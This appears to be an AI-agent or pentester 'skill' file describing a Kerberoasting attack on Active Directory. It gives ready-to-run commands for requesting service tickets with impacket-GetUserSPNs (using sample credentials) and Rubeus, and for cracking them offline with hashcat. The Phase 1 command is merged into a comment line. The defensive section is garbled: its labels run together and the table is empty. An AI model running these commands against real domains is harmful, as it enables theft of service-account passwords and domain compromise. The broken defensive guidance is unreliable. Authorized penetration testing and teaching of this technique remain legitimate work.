---
name: kerberoasting-attack
description: >
  Exploit Active Directory environments using Kerberoasting. This skill details how to identify 
  Service Principal Names (SPNs) associated with user accounts, request their TGS tickets, 
  and crack the RC4 encrypted component offline to recover service account passwords.
domain: cybersecurity
subdomain: penetration-testing
category: Active Directory
difficulty: intermediate
estimated_time: "1-2 hours"
mitre_attack:
  tactics: [TA0006]
  techniques: [T1558.003]
platforms: [windows, active-directory]
tags: [active-directory, kerberos, kerberoasting, credential-access, impacket, hashcat, rubeus]
tools: [impacket-GetUserSPNs, hashcat, rubeus]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Kerberoasting Attack

## When to Use
- When you have obtained initial access to an Active Directory domain (valid user credentials or a compromised domain-joined machine).
- To compromise service accounts, which often have elevated privileges (like Domain Admin) and rarely changed passwords.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying SPNs and Requesting Tickets (Linux/Impacket)

Using valid domain credentials from a Linux attack machine:

```bash
# Concept: Query AD for accounts with SPNs and request TGS tickets formatted for Hashcat impacket-GetUserSPNs target.local/low_priv_user:Password123! -request -outputfile kerberoast_hashes.txt -format hashcat
```

### Phase 2: Extracting Hashes from a Windows Host (Rubeus)

If executing directly from a compromised Windows workstation (where you are already authenticated as a domain user):

```powershell
# Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat
```

### Phase 3: Offline Password Cracking

Extract the hashes from the output file and run them through Hashcat.
Hashcat mode for Kerberoast (RC4) is `13100`. (If AES, mode is `19600` or `19700`).

```bash
# hashcat -m 13100 -a 0 kerberoast_hashes.txt rockyou.txt -O
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Valid AD Domain Access? ] --> B{Yes}
    B --> C[Query SPNs ]
    C --> D[Request TGS Tickets ]
    D --> E[Export to Hashcat Format ]
    E --> F[Offline Crack ]
```

## 🔵 Blue Team Detection & Defense
- **Strong Service Account Passwords**: **Monitor Kerberos Event ID 4769**: **Use Group Managed Service Accounts (gMSA)**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Kerberoasting Attack — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Impacket Docs: [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- Mitre ATT&CK: [Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
